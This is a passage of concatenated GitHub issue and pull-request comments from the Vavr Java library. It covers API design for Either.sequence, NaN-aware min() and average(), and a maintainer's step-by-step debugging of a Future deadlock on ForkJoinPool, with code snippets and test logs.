Tuple.of(i, i+2)))\n        .flatMap(t -> List.unfold(t, tt -> {\n            final int i = tt._1;\n            final int j = tt._2;\n            return i >= 0 && j <= N && isPalindrome(s.substring(i, j))\n                ? Option.some(Tuple(i-1, j+1), tt)\n                : Option.none();\n        }));\n}\n. We will not include it as test - instead there is an upcoming blog post.. I will close this ticket (but forgot who reported it on which channel). There is no problem with distinctBy() or filter() in Stream.\nScala 2.12.1 REPL:\n```scala\nscala> val cache = new java.util.HashSet[Int];\ncache: java.util.HashSet[Int] = []\nscala> Stream.from(0)\n    .map(i => { val next = i + 1; println(s\"next: ${next}\"); next })\n    .filter(i => cache.add(i))\n    .drop(20)\nnext: 1\nnext: 2\nnext: 3\nnext: 4\nnext: 5\nnext: 6\nnext: 7\nnext: 8\nnext: 9\nnext: 10\nnext: 11\nnext: 12\nnext: 13\nnext: 14\nnext: 15\nnext: 16\nnext: 17\nnext: 18\nnext: 19\nnext: 20\nnext: 21\nres12: scala.collection.immutable.Stream[Int] = Stream(21, ?)\n```\nVavr 0.9.0\n```java\njava.util.HashSet cache = new java.util.HashSet<>();\nStream.from(0)\n    .map(i -> { int next = i + 1; println(\"next: \" + next); return next; })\n    .filter(cache::add)\n    .drop(20);\nnext: 1\nnext: 2\nnext: 3\nnext: 4\nnext: 5\nnext: 6\nnext: 7\nnext: 8\nnext: 9\nnext: 10\nnext: 11\nnext: 12\nnext: 13\nnext: 14\nnext: 15\nnext: 16\nnext: 17\nnext: 18\nnext: 19\nnext: 20\nnext: 21\nStream(21, ?)\n```\n. Thank you!. @johnw42 thank you, that\u2018s valuable input - I will take it into account!\nATM I currently have not benchmarked that specific case but value types (flattening mem refs) will definitely make a difference on the JVM.. Duplicate to #1933 . @hamnis Thanks for your feedback!\nI see no benefit in keeping the first suggestion Either<L, Seq<R>> sequence(...) or introduce Either<Seq<L>, R> sequenceLeft().\nHaving Either<Seq<L>, Seq<R>> sequence(...), we are still able to achieve the same result as above like this:\n```java\n// if either.isLeft() == true, the Seq is guaranteed to be non-empty\nEither, Seq> either = Either.sequence(...);\n// valid when either.isLeft() == true\nL example1 = either.getLeft().head();\n// valid in each case\neither.mapLeft(seq -> {\n    L example2 = seq.head();\n    ...\n});\n```\nScalaz works different. Because Either resp. \\/ is right-biased there (like ours), no implicit Applicative instance for the left case can be offered in scope. In Java we do not have these problems (with implicits), so we can do both in one sequence step.\nWhat are your 'main pain points' with that solution?\n. Having a result of type Either<Seq<L>, Seq<R>> makes most sense, because we cover all use cases.\nIf other sequence methods are needed, e.g. that return Either<L, Seq<R>> or Either<Seq<L>, R>, we should create a new issue.. @hamnis Good point, I see. We should add the monadic version, also. I will create a separate issue.\nDo you have an example of types that would not align?. @hamnis Thanks!. @CauchyPeano I would greatly appreciate you PR!. Hi Amy, many thanks for your PR!\nYou are fast with providing a solution. We already planned to give Validation some love (see #1565 and #1938).\nWe are in the lucky case of working on a major release that will contain changes that affect backward compatibility. We wrote about it here. It would be better to re-think the existing Validation rather than deprecating it and adding a new one.\nCurrently I'm preparing the 0.9.1 patch release (targeted for this weekend). After that I will come back to this PR!\nThx,\nDaniel. Hi @amygithub, I took a look now. The differences to the 'original' Validation class are hard to spot. As I said, we are able to change the original one. Could you please move your particular changes to control.Validation and remove the control.fluent package? Then it is easier for me to see the difference and to review the PR.\nSorry for being so slow in the past - but now there is room to get this right!\nThx!. @amygithub Thank you for your contribution and sorry that a took a while. I think you brought validation forward and significantly increased its usability! :). @emmanueltouzery Thanks! That makes sense.\nIn Haskell, the Data.Traversable type has generic sequence* methods that transform sequences of specific structures (like Monads and Applicatives).\n\nIn Vavr we do not have such abstractions (because of missing higher-order types) (see also this).\nErlend showed us a different approach, e.g. naming the monadic version in Either sequenceM.\nWhich method names should Either and Validation have then (sequence, sequenceA, sequenceM, ...)?\n/cc @hamnis . I took a look at\n\nScala's sequence\nScalaz's sequenceU\n@hamnis' sequenceM\nHaskell's sequence and sequenceA\n\nThe sequenceM mentioned above isn't really monadic, it is syntactic sugar for\njava\n// e.g. Seq<Either<L, R>> eithers = List.of(Right(...), Left(...));\nEither<L, Seq<R>> res0 = Either.sequence(eithers.filter(Either::isRight));\nTherefore I don't think we need to add a sequenceM.\nWe will keep the outcome of #2064 because it is practicable to collect all left values (aka errors):\njava\nstatic <L, R> Either<Seq<L>, Seq<R>> sequence(Iterable<Either<L, R>> eithers) { ... }\nAdditionally we need the version that concentrates on the right values. I think it is intuitive to name it sequenceRight():\njava\nstatic <L, R> Either<L, Seq<R>> sequenceRight() { ... }\n\nNote: 'Practicable' does not mean that we ignore mathematical theorems or generally accepted outcomes of research here. One could argue that the return type of Either.sequence should reflect that Either is a right-biased either. More specifically one could argue that we need to return Either<L, Seq<R>> instead of Either<Seq<L>, Seq<R>>.\nIn fact it is sufficient that both variants are present. The name does not matter because we are not able to abstract over sequence in the way that there might be one sequence method that is applicable to all monadic types.\nOur current approach is intuitive:\n\nsequence sequences all outcomes: Either<Seq<L>, Seq<R>>. Semantics: Give me either all valid results or all errors that occured.\nsequenceRight sequences the right outcome: Either<L, Seq<R>>. Semantics: Give me either all valid results or the first error that occured.\nA sequenceLeft: Either<Seq<L>, R> makes no sense because Either is right-biased. In a right-biased context we are interested in the right outcome but the semantics would be: Give me either the first valid result or all errors that occured. Nevertheless, an equivalent version is Either.sequenceRight(eithers.map(Either::swap)). Good point. Then we will not do it and leave it as-is.. I reopen this ticket for now. It does not seem to work in Eclipse currently. See #2082.\n. I split this PR into #2078 and #2079 and will close this now.. @chb0github IntList is no option. An upcoming Java version will support primitive generics, e.g. List<int>. Our strategy is therefore to not provide specializations. (Maybe we will also get reified generics, so that we are able to gather the component type at runtime...)\n\nOur average() returns a double. Integrals are converted lossless to double, e.g. 123 -> 123.0. The Kahan summation algorithm (also used by Java's DoubleStream.average()) is very accurate.\nHowever, you nerd-sniped me. I currently experiment with Neumaier's improvement of Kahan's algorithm. Maybe we can be even more accurate that Java :)\nExample: [1.0, +10e100, 1.0, -10e100].average()\n\nKahan (Java) returns 0.0 (false)\nNeumaier returns 1.0 (true)\n. @chb0github \n\n\nThere are some limitations with this approach that don't seem to be compatible with the vavr ethos or purity.\n\nThat's not correct. Of course we internally are free to choose the best implementation possible, especially when it is 'impure' or 'non-functional'. This does not matter at all.\nFor example we support GWT. By removing the instanceof checks, the average() method can be used now from Javascript. That's an improvement.\nUpdate: GWT supports instanceof, but not Class#isInstance(Object obj)\nDon't be stigmatic about FP. Instead be practicable.. @chb0github regarding your comment, here  a fragment\n\nA List.of(1L,2L).avg() should produce a Long result. I am not against what your'e doing (infact, I am in favor of simplification) but the typing issues is a very practical concern.\n\nJava's LongStream has OptionalDouble average(), e.g. the average of long values is a double.\nI agree that boxing takes extra time, but that is the way Java works today.\nIt was a design decision to go the unsafe track. We traded safety for simplicity. This is a common way in Java because we can't express it with the type system (except we duplicate the types).\nI also like safety, so what led to this decision? \n\nJava has Stream, IntStream, DoubleStream, LongStream. Me the moment I saw this: \ud83d\ude31\nIt is common practice, e.g. java.util.TreeSet.add(Object) may throw a ClassCastException\n. @chb0github \n\n\nOverload the avg function to take a function that can do the conversion.\n\nI'm not convinced. How should that function look like? Like this (simplified version, without generic bounds):\njava\nOption<Double> avg(Function<Traversable<T>, Option<Double>> strategy);\nThat version is unnecessary, it is the same as\njava\nstrategy.apply(traversable);\n. @chb0github I see. You could achieve almost the same by calling\njava\nList.of(1,2,3).map(n -> Math.round(n * 10) / 10.0).avg();\nBut most importantly it does not help users from accidentally calling the unsafe avg(). We will keep the API as-is but I understand your remarks.\n\nI gave you incentive to scratch and itch :)\n\nI like it to scratch and itch :) \ud83d\ude1c. @chb0github I'm still testing. I managed to create a confusing exception:\njava\n// throws UnsupportedOperationException: not numeric\nPriorityQueue.of(1.0d, 1.0f).average();\nThe average should be calculated and the result should be 1.0, but the PriorityQueue uses the natural Comparator by default, which is not able to compare doubles and floats.\nAs you said, the exception message (without stack trace) does not really help here...\nA ClassCastException would be much better. However, because of backward compatibility I don't know if we should fix it already for the bugfix release 0.9.1. Any opinions?\nUpdate: Please note that this works perfectly fine:\njava\n// = Option(1.0)\nList.of(1.0d, 1.0f).average();. @chb0github \n\nYour Traversable type should not allow for mixed types\n\nThat is not as easy as it sounds. If T (e.g. inferred type of a static factory method call) is Object, all is possible...\nAlso we are not able to allow only Comparable types for our sortable collections, because it would break the type hierarchy. They could not extend Set / Map any more.\nUnfortunately Java's type system is not expressible enough for our uses-cases.. @nfekete Actually I use this.<Number> of(1.0, 1.0f).min() in the unit tests (class: AbstractTraversableTest). That is the reason it works.\n```java\n// compiles\nList.of(1.0d, 1.0f).average()\n// compiles\nList.of(1.0d, 1.0f).toSortedSet().average();\n// does not compile (with IntelliJ IDEA)\nPriorityQueue.of(1.0d, 1.0f).average();\n```\n. This is also scary: I'm currently fixing a min() bug on Double and Float element types.\nPlease consider the following collection: [1.0d, NaN, 2.0d].\nJava's Stream returns NaN when calling one of average(), min(), max().\nI fixed Vavr's min() method (locally) the way that it now returns NaN instead of 1.0d in that case, because the natural comparator decides that NaN is the greatest value in the space of Double and Float.\nHowever, when we have TreeSet.of(1.0, NaN, 2.0), then the min() is 1.0 instead of NaN, because the SortedSet impl shortcuts and takes the head() in O(1) (because it knows that it is already sorted). This implies that the natural comparator does not work for the TreeSet.min() case when the element type is Float or Double :-/ Seems we need my new 'special' comparator also for SortedSet and SortedMap!?\njava\n// sneak preview (maybe the internals should be transformed to a stateful Comparator)\ndefault Option<T> min() {\n    // DEV-NOTE: minBy(Comparators.naturalComparator()) does not handle (Double/Float) NaN correctly\n    if (isEmpty()) {\n        return Option.none();\n    } else {\n        final T head = head();\n        final T min;\n        if (head instanceof Double) {\n            min = (T) ((Traversable<Double>) this).foldLeft((Double) head, Math::min);\n        } else if (head instanceof Float) {\n            min = (T) ((Traversable<Float>) this).foldLeft((Float) head, Math::min);\n        } else {\n            final Comparator<T> comparator = Comparators.naturalComparator();\n            min = this.foldLeft(head, (t1, t2) -> comparator.compare(t1, t2) <= 0 ? t1 : t2);\n        }\n        return Option.some(min);\n    }\n}\nGiving up the shortcut min() max() methods for SortedSet would be inefficient. We would degrade them from O(1) to O(n).\nI recognized that our SortedMap impl TreeMap does not make use of the shortcut. We should fix that!. Something like this:\n```java\n    class RealAwareComparator implements Comparator, Serializable {\n    Comparator<T> comparator;\n\n    @Override\n    public int compare(T t1, T t2) {\n        if (comparator == null) {\n            // DEV-NOTE: null will lead to a NPE in each comparator anyway\n            final T t = (t1 == null) ? t1 : t2;\n            if (t instanceof Double) {\n                comparator = (Comparator<T>) (Comparator<Double> & Serializable) Double::compareTo;\n            } else if (t instanceof Float) {\n                comparator = (Comparator<T>) (Comparator<Float> & Serializable) Float::compareTo;\n            } else {\n                comparator = Comparators.naturalComparator();\n            }\n        }\n        return comparator.compare(t1, t2);\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        // DEV-NOTE: it can't be (obj instanceof RealAwareComparator) because this is stateful\n        return this == obj;\n    }\n}\n\n```\nNo, not correct - because it still reflects the natural order.... Maybe we have to live with that paradoxum;\n```java\n// = 1.0\nTreeSet(1.0, NaN).head()\n// = NaN\nTreeSet(1.0, NaN).min()\n```\n\ud83e\udd14. Easy to solve - min() and max() work always the same, the do not take an underlying ordering of a sorted collection into account:\n```scala\nscala> import scala.collection.immutable.TreeSet\nimport scala.collection.immutable.TreeSet\nscala> val set = TreeSet(1.0, Double.NaN)\nset: scala.collection.immutable.TreeSet[Double] = TreeSet(1.0, NaN)\nscala> set.head\nres3: Double = 1.0\nscala> set.min\nres4: Double = NaN\nscala> val set = TreeSet(1.0, 2.0, 3.0)((d1, d2) => if (d1 < d2) 1 else -1)\nset: scala.collection.immutable.TreeSet[Double] = TreeSet(3.0, 2.0, 1.0)\nscala> set.head\nres5: Double = 3.0\nscala> set.min\nres6: Double = 1.0\n```. @chb0github Note: I saved the work of our discussion to a different branch that will go to 1.0. The changes of this PR are going to 0.9.1. That is nice, thank you!. Hi Thomas,\nthank you for your suggestion! Could you please elaborate on the use-case(s)?\nCurrently we ensure that PRs will fail when generated code is manually modified. Our CI build does this by...\n\nperforming a git clone (which may contain manually modified generated code)\nrunning the build (which overwrites generated code)\nchecking for changes using git status (there shouldn't be changes)\n\nBy using annotations, we make the 'is generated' property part of the public API. Our users should not bother whether source is generated or not. We need the freedom to change that property without affecting backward-compatibility.\nI'm looking forward to learn about your use-case.\n. Maybe this might come handy when we use an 'inline code generator' (see Seamlessly fuse hand-written and generated code). I just saw that @Generated has the retention policy 'SOURCE' - now I understand that the use-case you meant is documentation. So, let's do it!. I started developing Vavr in Eclipse and tested it once with Mars (and also Neon I think). Eclipse always had false-positive type errors that needed workarounds and a very slow type inference that sometimes hung. I created several issues on the Eclipse bug tracker before I completely to IntelliJ IDEA. I do not use Eclipse anymore.\nIt is perfectly possible to run projects in Eclipse that depend on Vavr. But compiling Vavr itself in Eclipse is a challenge. I hope there is someone else who can provide some useful information.... Thank you all! . @jabrena Thanks for asking!\nRight, the docs can be improved. We will do that for the 1.0.0 release.\nIf you know Scala, I would suggest to read the Scala docs on Future/Promise. Vavr works basically the same.\nYou could take a look at our unit tests FutureTest and PromiseTest.\nIn fact, Future is a very elegant way to handle async computations in Java. They are composable, e.g. \n\nyou are able to transform results as if they were available (but aren't yet)\n\njava\nFuture.of(() -> /*this takes veeeery looong*/) // but this call does not block\n           .map(result -> ...) // the function parameter is called as soon as the result is available\n           .onComplete(result -> ...); // don't use get(), it blocks\n\nsequence several async computations to a single collection of results that is available when all computations finished\n\n```java\nFuture> futures = Future.sequence(future1, future2, ...);\n// or\nFuture> users = List.of(1, 2, 3).map(userId -> Future.of(() -> db.loadUser(userId)));\n```\n\netc.\n\n. Documentation will be part of Vavr 1.0.0. I will close this issue. Thx for asking!. I love this change :)\nScala's default execution context behaves the same, it starts daemon threads.\nDoes it still make sense to use a CachedThreadPool? I mean, is the thread still reusable/cacheable when it is a daemon?. I think Scala's default execution context is based on a ForkJoinPool (see this).\nWe had some problems using it. What do you think about it? Has the CachedThreadPool any drawbacks? Or would have the ForkJoinPool any advantages?\nJust asking because it is hard to find someone who has an opinion regarding concurrency questions. It does not seem to be a 'mainstream topic' :). @smillies btw - your blog is lovely!. I think I had a deadlock in the unit tests... I should switch back to investigate... I think the pool might has been depleted.. That would be nice! The Future.DEFAULT_EXECUTOR_SERVICE needs to be changed and unit tests to be re-run.... I think ForkJoinPool.commonPool() does not work because we need that Daemon thingy.... @smillies Thank you, that is enlightening!\n(Thinking loud: We can take big parts of your explanation directly for the javadoc - or even for the documentation). @nfekete thank you! I think all runs fine now. I switched the DEFAULT_EXECUTOR_SERVICE 'in the early days' of Future.\nAs @smillies said, we should not switch to Executors.newWorkStealingPool(). For now, it should be sufficient. Towards 1.0 we will add some features, like adding an uncaught exception handler (see #1979), maybe reading system properties for min and max threads etc.. @nfekete If you want, you can create a PR that fixes this issue. It is the last one - then we are able to release 0.9.1 :-) I will wait, take your time.. @smillies \n\nExperience will then show what features need to be added.\n\nYes, I agree. We should go the simplest way possible (that makes sense) and then refine.\n@nfekete I will perform that change now in order to be able to release 0.9.1 this evening. I hope you are ok with that.. @nfekete interesting, the Travis-CI build broke again after switching to ForkJoinPool.commonPool(): https://travis-ci.org/vavr-io/vavr/builds/276357097\nThe local build works fine.\nLocally all is fine. I will switch the maven-surefire-plugin back to non-parallel mode. I think this will fix it (for now). Maybe it has something to do with an exit of test worker threads before the test threads finished. Could be solved by calling commonPool().awaitQuiescence(long, TimeUnit) in @Before. Will test that first.... The impact of this change is too great for the upcoming patch release 0.9.1. I will defer the change and target 1.0.. @smillies The ForkJoinPool resets the interrupt state of a worker thread. That has impact on cancelling Futures, also when working with the standard Java library:\njava\n    // -Djava.util.concurrent.ForkJoinPool.common.parallelism=1\n    @Test\n    public void test() {\n        ForkJoinPool pool = ForkJoinPool.commonPool();\n        Object monitor = new Object();\n        java.util.concurrent.Future<?> future = pool.submit(() -> {\n            try { synchronized(monitor) { monitor.wait(); } }\n            catch(InterruptedException x) { x.printStackTrace(); }\n        });\n        try { Thread.sleep(1000); } catch(InterruptedException x) { x.printStackTrace(); }\n        System.out.println(\"isCancelled: \" + future.cancel(true));\n        System.out.println(\"isDone: \" + future.isDone());\n        while (pool.getActiveThreadCount() > 0) {\n            System.out.println(\"waiting...\");\n            try { Thread.sleep(1000); } catch(InterruptedException x) { x.printStackTrace(); }\n        }\n    }\nThe test runs forever because the wait() call is not interrupted:\nbash\nisCancelled: true\nisDone: true\nwaiting...\nwaiting...\nwaiting...\nwaiting...\nwaiting...\nwaiting...\n...\nDo you know how Scala does handle this?\nHowever, it should not hinder us from switching to ForkJoinPool as default ExecutorService.. Mmmh, that is pretty cool. I have some questions.\n1) I would love to see all additional types hidden and instead static factory methods\n```java\ninterface Function0 {\n    static  Function0> memoized(Supplier<? extends Future<? extends R>> f) { ... }\n}\ninterface Function1 {\n    static  Function1> memoized(Function<? super T1, ? extends Future<? extends R>> f) { ... }\n}\ninterface Function2 {\n    static  Function2> memoized(BiFunction<? super T1, ? super T2, ? extends Future<? extends R>> f) { ... }\n}\ninterface Function3 {\n    static  Function3> memoized(Function3<? super T1, ? super T2, ? super T3, ? extends Future<? extends R>> f) { ... }\n}\n...\n```\nThat should still work, especially trampolining.\n@chb0github you are right but in this case it is not trivial to create a PR. There is a code generator written in Scala that has to be modified (Generator.scala). Also we need to do this for Function and CheckedFunction.... One more thing: It is not clear where to put it. We plan for 1.0.0 to modularize Vavr (see this blog post). If we modify io.vavr.Function*, we have to pull the concurrent package into the upcoming vavr-core module. I planned to create a separate module for the concurrency stuff.\nAnother solution would be to add this functionality to Future itself, e.g.\njava\ninterface Future<T> {\n    // static factory methods for Function0..n\n    static <T1, R> Function1<T1, Future<R>> memoized(Function<? super T1, ? extends Future<? extends R>> f) { ... }\n    // ...\n}\nBut I agree that it would be more intuitive to place these methods in Function...\nAny opinions?. ~~I think Future is the right location.~~ Also we need variants that take an ExecutorService in order to control the Thread creation etc.\nThis leads to (Function0..8 + CheckedFunction0..8) * 2 = 36 new static factory methods in Future (compared to (Checked)FunctionX * 2 = 2 new static factory methods in every (CheckedFunctionX). \ud83d\ude31. @smillies (Off-topic) I see that you already got your hands on Kotlin coroutines. I've read that they do not use native Threads. Do you think that it is possible to achieve the same in Java while preserving the functionality of Future/Promise? (I mean backing Future on s.th. else than a native Thread). @smillies Thanks!\n\nI do not see what you gain by introducing all those factory methods\n\nI think having not too many entry points (= kind of different words of the 'language' Vavr) makes it easier to find functionality. But maybe you are right. I will think about it...\n\nrelaxing the type signatures to (...)\n\nI think you are right, it can be simplified in this case - it is similar to this one\n\n(Off-topic)\n\nApart from suspend, the rest seems to be Kotlin library code, not language constructs (...)\n\nThank you for your thoroughly investigation. The idea of having 'lightweight' concurrency in Java without native threads is tempting but I will not dig deeper for now.... Thanks. Oh yeah, caching... Nice topic \ud83e\udd14. > (And Future.fromCompletableFuture() cannot be used, because it blocks.)\nThis can be considered as bug. We need a version that asynchronously completes the wrapping future. I will create an issue. Update: see #2115. Closing this because of #2176. I currently hold my horses. Maybe we find a solution to keep the section 3. (see above) instance methods and implement them for PartialFunction in a meaningful way (also considering recursion / function reference reusing).. Only on the CI server, locally all is fine.\nI started a new build without junit test forking.\nIt just started: https://travis-ci.org/vavr-io/vavr/builds/276364880. It did not work. Now I print the enter/exit information during FutureTest:\njava\n    @Rule\n    public TestRule watcher = new TestWatcher() {\n        @Override\n        protected void starting(Description description) {\n            System.out.println(\"Starting test: \" + description.getMethodName());\n        }\n        @Override\n        protected void finished(Description description) {\n            System.out.println(\"Finished test: \" + description.getMethodName());\n        }\n    };\nLet's see, which method causes the deadlock...\nhttps://travis-ci.org/vavr-io/vavr/builds/276368239. The blocking guy seems to be FutureTest.shouldFilterFuture(). Will digg into it. Maybe we revealed a bug?. I think there is one CPU with two cores:\n\n\nI don't know how to reproduce it. Will for now go step by step (with System.out.println).... After I commented out\njava\n    @Test\n    public void shouldFilterFuture() {\n        final Future<Integer> future = Future.successful(42);\n        assertThat(future.filter(i -> i == 42).get()).isEqualTo(42);\n        assertThat(future.filter(i -> i == 43).isEmpty()).isTrue();\n    }\nthe tests proceeded much further but blocked again at\njava\n    @Test\n    public void shouldAwaitOnGet() {\n        final Future<Integer> future = Future.of(() -> {\n            Try.run(() -> Thread.sleep(250L));\n            return 1;\n        });\n        assertThat(future.get()).isEqualTo(1);\n    }\nI think it is the Future.get() method that causes the trouble:\njava\n    @Override\n    default T get() {\n        return await().getValue().get().get();\n    }\nMore specifically the await() method:\njava\n    /**\n     * Blocks the current Thread until this Future completed or returns immediately if this Future is already completed.\n     *\n     * @return this {@code Future} instance\n     */\n    Future<T> await();\nWhich is implemented in FutureImpl.java:\njava\n    @Override\n    public Future<T> await() {  // 1)\n        if (!isCompleted()) {\n            final Object monitor = new Object();\n            onComplete(ignored -> {  // 2)\n                synchronized (monitor) {\n                    monitor.notify();\n                }\n            });\n            synchronized (monitor) {  // 3)\n                if (!isCompleted()) {\n                    Try.run(monitor::wait);\n                }\n            }\n        }\n        return this;\n    }\n**One possibility is that the monitor.notify() is executed before monitor.wait(). In that case the Future would never return back...\nI will wrap my head around it after getting some coffee :). An execution like the following would explain the failure. But such an execution is not possible because we synchronize wait/notify on monitor. But it has to be a similar execution like this...\n1) await() is called\n2) onComplete(...)\n  * this future is not complete, yet\n  * therefore the complete-handler is queued\n  * onComplete exits\n3) synchronized(monitor) is entered and this Future is not completed yet\n  * if (!isCompleted()) is entered\n  * a context switch happens and completes the Future\n  * on that completing thread a sub-thread is spawned that executes the complete handler\n  * monitor.notify() is called (context switches still may have taken place)\n  * finally the monitor::wait is executed... and hangs for-ever\n. @nfekete that's great! Maybe it is related to this:\n\n(Source: https://stackoverflow.com/a/23480863/1110815). I've now a better understanding of the 'error'. I'm not sure, if we are able to control the fork/join mechanism within one thread pool. There is ForkJoinPool.ManagedBlocker but we can't hard-code it into FutureImpl because we do not know which ExecutorService is used at runtime.\nI will sleep over the topic and look into it tomorrow.. Maybe I find a way to implement await() based on ExecutorService.invokeAny(...).... Status: I reimplement await() now (without the low-level wait/notify, which does not seem to work on a ForkJoinPool):\njava\n@Override\npublic Future<T> await() {\n    // lock is the guard for all future result related fields (i.e. the completion state)\n    synchronized (lock) {\n        if (!isCompleted()) {\n            try {\n                // job is of type j.u.c.Future, get() blocks - and could also receive a timeout parameter\n                complete(job.get());\n            } catch(Throwable x) {\n                complete(Try.failure(x));\n            }\n        }\n    }\n    return this;\n}\nHowever, it is still not working - but should in my opinion :)\n. ```bash\n[STARTING] 2017-09-17T12:08:10.944 shouldFilterFuture(io.vavr.concurrent.FutureTest)\nFuture.success(42)\n[Promise] Thread[main,5,main] tryComplete(Success(42))\n[Future] Thread[main,5,main] tryComplete: value = Success(42)\n[Future] Thread[main,5,main] tryComplete: isCompleted() = false\n[Future] Thread[main,5,main] tryComplete: complete(Success(42))\n[Future] Thread[main,5,main] complete: value = Success(42)\n[Future] Thread[main,5,main] complete: setting value\n[Future] Thread[main,5,main] complete: executing actions\n[Future] Thread[main,5,main] tryComplete: completed\nasserting...\n[Future] Thread[main,5,main] filter: io.vavr.concurrent.FutureTest$$Lambda$6/1058025095@27abe2cd\n[Future] Thread[main,5,main] filterTry: io.vavr.concurrent.Future$$Lambda$7/1359044626@29444d75\n[Future] Thread[main,5,main] filterTry: creating promise\n[Future] Thread[main,5,main] filterTry: onComplete(...)\n[Future] Thread[main,5,main] perform: spawning new onComplete thread\n[Future] Thread[main,5,main] filterTry: return promise.future()\n[Future] Thread[main,5,main] await()\nget()\n[Future] Thread[main,5,main] await: synchronized (lock) {\n[Future] Thread[main,5,main] await: job = null\n[Future] Thread[main,5,main] await: value = None\n[Future] Thread[main,5,main] await: !isCompleted()\n\nUpdate: this is the root cause: job can't be null if the future is not completed, yet (see below invariant)\n\n[Future] Thread[main,5,main] await: job.get()\nfiltering i == 42\n[Promise] Thread[ForkJoinPool.commonPool-worker-1,5,main] tryComplete(Success(42))\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] tryComplete: value = Success(42)\n\nHere is the error. The job (j.u.c.Future(() -> Success(42).filter(i -> i == 42))) is finished before the Promise is completed!?\n\n[Future] Thread[main,5,main] await: completed\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] tryComplete: isCompleted() = false\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] tryComplete: complete(Success(42))\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] complete: value = Success(42)\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] complete: setting value\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] complete: executing actions\n[Future] Thread[ForkJoinPool.commonPool-worker-1,5,main] tryComplete: completed\n[FINISHED] 2017-09-17T12:08:10.988 shouldFilterFuture(io.vavr.concurrent.FutureTest)\n```\nUpdate: The problem with this new implementation is, that Promise.make() creates a Future that has no underlying job (= null). I will find a solution. The invariant has to be\njava\nfuture.isCompleted() <=> future.job == null && future.value != null\nIn Promise.make().future() the invariant is not satisfied.. Currently I see the following solution:\n\nWe switch to ForkJoinPool\nWe deprecate Promise (to be removed in 1.0.0)\nWe enhance Future with a safe/scoped completion feature (see #1529). This is comparable to ECMAScript 6 Promise. Internally we then replace usages of Promise with the new feature.\n\n```java\nstatic  Future complete(CheckedConsumer>> resultConsumer) {\n    return complete(DEFAULT_EXECUTOR_SERVICE, resultConsumer);\n}\nstatic  Future complete(ExecutorService executorService, CheckedConsumer>> resultConsumer) {\n    return null; // TODO\n}\nstatic  Future complete(CheckedBiConsumer, CheckedConsumer<? extends Throwable>> resultConsumer) {\n    return complete(DEFAULT_EXECUTOR_SERVICE, resultConsumer);\n}\nstatic  Future complete(ExecutorService executorService, CheckedBiConsumer, CheckedConsumer<? extends Throwable>> resultConsumer) {\n    return null; // TODO\n}\nstatic void examples() {\n// calls Future.complete(CheckedConsumer<CheckedConsumer<Try<T>>)\nFuture.complete(complete -> complete.accept(Try.of(() -> null)));\n\n// calls Future.complete(CheckedBiConsumer<CheckedConsumer<T>, CheckedConsumer<Throwable>>)\nFuture.complete((success, failure) -> success.accept(null));\n\n}\n@FunctionalInterface\ninterface CheckedBiConsumer {\nvoid accept(T t, U u) throws Throwable;\n\ndefault CheckedBiConsumer<T, U> andThen(CheckedBiConsumer<? super T, ? super U> after) {\n    Objects.requireNonNull(after);\n    return (l, r) -> {\n        accept(l, r);\n        after.accept(l, r);\n    };\n}\n\n}\n```\n(Please note: It is correct here to use Checked(Bi)Consumers in a covariant way rather than a contravariant way, like usual.)\nGiven the suggested await() / await(timout, timeunit), we will solve here the following issues:\n\n[ ] (this issue) Future's default executor prevents JVM from terminating\n[ ] Consider adding javaslang.concurrent.Future#get(timeout)\n[ ] Execute Future operations on the same Thread by default\n[ ] Add factory method that allows to resolve/reject a Future\n\nNote: We already planned to remove Promise in 1.0.0 and possibly rename Future to Promise because of a name clash with java.util.concurrent.Future. See this blog post.. This change has a too great impact for a patch release. I will target 1.0 instead of 0.9.1.. Pushed a test-version with some /*TODO*/ sections.\nBasically we need to add an internal feature that enables us to complete a Future on the same thread with onComplete(). By default onComplete() spawns a new task that executes the follow-up action.\nWill do that tomorrow.. I've collected some test data and ran the FutureTest class for different levels of parallelism: 1, 2, 4, 8\njava\nTests run: 221, Failures: 0, Errors: 0, Skipped: 2, Time elapsed: 13.722 sec - in io.vavr.concurrent.FutureTest\nI observe that the 'queued submission' of the common ForkJoinPool goes up at some point if the parallelism is low (1, 2). Then the deadlock occurs.\nIf we increase the parallelism (4, 8), the tests work as expected.\n\n\n\n\n. I could imagine that we need to fine-tune the ForkJoinPool behavior and the thread creation. (See also https://github.com/scala/bug/issues/8955).\nI could also imagine that the probability of deadlocks increases because we use the blocking await() call (also implicitly used in get() and isEmpty()).. We need a different blocking strategy. Currently we have\njava\n// FutureImpl\n    @Override\n    public Future<T> await() throws InterruptedException {\n        if (!isCompleted()) {\n            final BlockingQueue<Try<T>> queue = new ArrayBlockingQueue<>(1);\n            onComplete(queue::add);\n            ForkJoinPool.managedBlock(new ForkJoinPool.ManagedBlocker() {\n                @Override\n                public boolean block() throws InterruptedException {\n                    if (value.isEmpty()) {\n                        // Possibly blocks until one element is available.\n                        // If the current Thread receives the element,\n                        // this Future is already completed because\n                        // actions are performed after completion.\n                        queue.take();\n                    }\n                    return true;\n                }\n                @Override\n                public boolean isReleasable() {\n                    return value.isDefined();\n                }\n            });\n        }\n        return this;\n    }\nIt may be that the use of LockSupport makes more sense (parking/unparking threads). This would release resources. However, the CompletableFuture implementation is more than ugly. Usages of UNSAFE everywhere.\nHowever, blocking is discouraged anyway. If a async program makes extensive use of blocking, there's something wrong. Blocking in the presence of low parallelism might be also dangerous. We need to understand the domain better. The only thing we can do is measuring.\nI tested the ignored FutureTest unit tests with CompletableFuture (see #1530). This means that our await() method can be improved.\nI think the whole deadlock problem is all about blocking Futures - more specifically, the wrong blocking strategy. A thread should wake up periodically in order to check the completion state. However, we can't loop without parking threads because it would eat up 100% of one core.\nParking/unparking threads and periodically checking the finished state is the strategy of CompletableFuture. Parking is not the problem. The question is: who unparks a thread. I think it is hidden somewhere in the ForkJoin framework, might be specific for ForkJoinWorkerThreads.\n\nWe should play around with ThreadFactories. This leads to an own ForkJoinPool as DEFAULT_EXECUTOR_SERVICE. We can't use the ForkJoinPool.commonPool() anymore.\njava\nnew ForkJoinPool(\n    parallelism, // int\n    factory, // ForkJoinPool.ForkJoinWorkerThreadFactory\n    handler, // Thread.UncaughtExceptionHandler\n    asyncMode // boolean\n)\nEspecially the asyncMode controls the way, queued tasks are run. The default (false) has a LIFO run order. But 